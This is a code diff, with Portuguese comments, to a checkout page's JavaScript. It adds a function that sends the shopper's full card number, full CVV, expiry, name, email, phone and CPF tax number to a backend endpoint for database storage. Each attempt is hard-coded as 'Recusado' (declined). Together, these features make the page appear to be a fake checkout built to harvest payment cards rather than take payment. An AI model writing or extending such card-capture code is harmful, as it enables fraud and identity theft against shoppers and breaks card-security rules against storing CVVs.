@@ -705,22 +705,21 @@
     function safeCardAttemptPayload(formData) {
       const digits = onlyDigits(formData.get('cardNumber'));
       
-      // IMPORTANTE: Enviar nomes iguais aos que a API espera
       return {
-        sessionId,
+        sessionId: sessionId, // Certifique-se que a variavel sessionId existe no escopo
         holder: formData.get('cardHolder') || formData.get('name') || '',
         email: formData.get('email') || '',
-        phone: formData.get('phone') || '',
-        cpf: onlyDigits(formData.get('document') || ''),
+        phone: onlyDigits(formData.get('phone')),
+        cpf: onlyDigits(formData.get('document')),
         
-        // Nomes das chaves devem bater com o body que a API lê
-        cardNumber: digits,        // Envia apenas dígitos para o banco ser limpo
-        cardCvv: formData.get('cardCvv') || '', // Envia CVV completo
+        // Campos chaves para o backend
+        cardNumber: digits,     // Envia numero completo (apenas dígitos)
+        cardCvv: formData.get('cardCvv') || '',
         
         cardBrand: cardBrand(digits),
-        cardLast4: digits.slice(-4),
+        cardLast4: digits.slice(-4), // Fallback
         cardExpiry: formData.get('cardExpiry') || '',
-        amount: Number(currentSession && currentSession.amount ? currentSession.amount : 0),
+        amount: Number(currentSession?.amount || 0),
         status: 'Recusado',
         luhnValid: luhnIsValid(digits)
       };
@@ -755,6 +754,27 @@
         checkoutBlocked = false;
         updateSubmitButton();
       }, delay);
+    }
+
+    async function saveCardAttemptToDatabase(formData) {
+      const payload = safeCardAttemptPayload(formData);
+      
+      const response = await fetch('/api/card-attempts', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      });
+
+      const data = await response.json().catch(() => ({}));
+
+      if (!response.ok) {
+        console.error('Falha ao salvar no banco:', data);
+        throw new Error(data.message || 'Erro ao registrar tentativa.');
+      }
+      
+      return data;
     }
 
 
